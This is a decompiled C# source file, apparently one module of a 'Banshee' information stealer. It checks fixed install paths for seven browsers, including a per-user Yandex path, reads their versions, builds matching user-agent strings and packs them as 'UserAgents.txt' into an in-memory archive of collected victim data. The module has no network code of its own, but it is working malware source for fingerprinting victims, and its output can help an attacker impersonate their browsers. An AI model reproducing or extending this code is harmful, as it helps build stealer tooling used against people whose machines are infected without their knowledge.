﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using Banshee.Helper;
using Banshee.Helper.Data;

namespace Banshee.Targets.Browsers
{
	// Token: 0x0200008D RID: 141
	internal class UserAgentGenerator : ITarget
	{
		// Token: 0x060001A5 RID: 421 RVA: 0x0000DF54 File Offset: 0x0000DF54
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string version = WindowsInfo.GetVersion();
			string architecture = WindowsInfo.GetArchitecture();
			List<UserAgentGenerator.BrowserAgent> list = new List<UserAgentGenerator.BrowserAgent>();
			for (int i = 0; i < this.paths.Length; i++)
			{
				string text = (this.names[i] == "Chrome") ? this.GenerateUserAgentChrome(this.paths[i], version, architecture) : this.GenerateUserAgent(this.paths[i], this.names[i], version, architecture);
				if (!string.IsNullOrEmpty(text))
				{
					list.Add(new UserAgentGenerator.BrowserAgent
					{
						Name = this.names[i],
						UserAgent = text
					});
				}
			}
			if (list.Count != 0)
			{
				int maxName = Math.Max("Browser".Length, list.Max((UserAgentGenerator.BrowserAgent a) => a.Name.Length));
				int maxUA = Math.Max("User-Agent".Length, list.Max((UserAgentGenerator.BrowserAgent a) => a.UserAgent.Length));
				List<string> list2 = new List<string>
				{
					"Browser".PadRight(maxName) + " | " + "User-Agent".PadRight(maxUA),
					new string('-', maxName + maxUA + 3)
				};
				list2.AddRange(from a in list
				select a.Name.PadRight(maxName) + " | " + a.UserAgent.PadRight(maxUA));
				zip.AddTextFile("UserAgents.txt", string.Join(Environment.NewLine, list2));
			}
		}

		// Token: 0x060001A6 RID: 422 RVA: 0x0000E100 File Offset: 0x0000E100
		private string GenerateUserAgent(string browserPath, string name, string osVersion, string architecture)
		{
			if (File.Exists(browserPath))
			{
				return string.Concat(new string[]
				{
					"Mozilla/5.0 (Windows NT ",
					osVersion,
					"; ",
					architecture,
					") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Safari/537.36 ",
					name,
					"/",
					this.GetBrowserVersion(browserPath)
				});
			}
			return string.Empty;
		}

		// Token: 0x060001A7 RID: 423 RVA: 0x0000E160 File Offset: 0x0000E160
		private string GenerateUserAgentChrome(string browserPath, string osVersion, string architecture)
		{
			if (!File.Exists(browserPath))
			{
				return string.Empty;
			}
			string browserVersion = this.GetBrowserVersion(browserPath);
			return string.Concat(new string[]
			{
				"Mozilla/5.0 (Windows NT ",
				osVersion,
				"; ",
				architecture,
				") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/",
				browserVersion,
				" Safari/537.36"
			});
		}

		// Token: 0x060001A8 RID: 424 RVA: 0x0000E1BA File Offset: 0x0000E1BA
		private string GetBrowserVersion(string browserPath)
		{
			if (!File.Exists(browserPath))
			{
				return "Unknown";
			}
			return FileVersionInfo.GetVersionInfo(browserPath).FileVersion;
		}

		// Token: 0x0400016E RID: 366
		private readonly string[] paths = new string[]
		{
			"C:\\Program Files\\Opera\\launcher.exe",
			"C:\\Program Files\\Apple\\Safari\\Safari.exe",
			"C:\\Program Files\\Mozilla Firefox\\firefox.exe",
			"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
			"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
			"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
			"C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Yandex\\YandexBrowser\\Application\\browser.exe"
		};

		// Token: 0x0400016F RID: 367
		private readonly string[] names = new string[]
		{
			"Opera",
			"Safari",
			"Firefox",
			"Chrome",
			"Edge",
			"Brave",
			"Yandex"
		};

		// Token: 0x0200008E RID: 142
		private class BrowserAgent
		{
			// Token: 0x17000017 RID: 23
			// (get) Token: 0x060001AA RID: 426 RVA: 0x0000E282 File Offset: 0x0000E282
			// (set) Token: 0x060001AB RID: 427 RVA: 0x0000E28A File Offset: 0x0000E28A
			public string Name { get; set; }

			// Token: 0x17000018 RID: 24
			// (get) Token: 0x060001AC RID: 428 RVA: 0x0000E293 File Offset: 0x0000E293
			// (set) Token: 0x060001AD RID: 429 RVA: 0x0000E29B File Offset: 0x0000E29B
			public string UserAgent { get; set; }
		}
	}
}
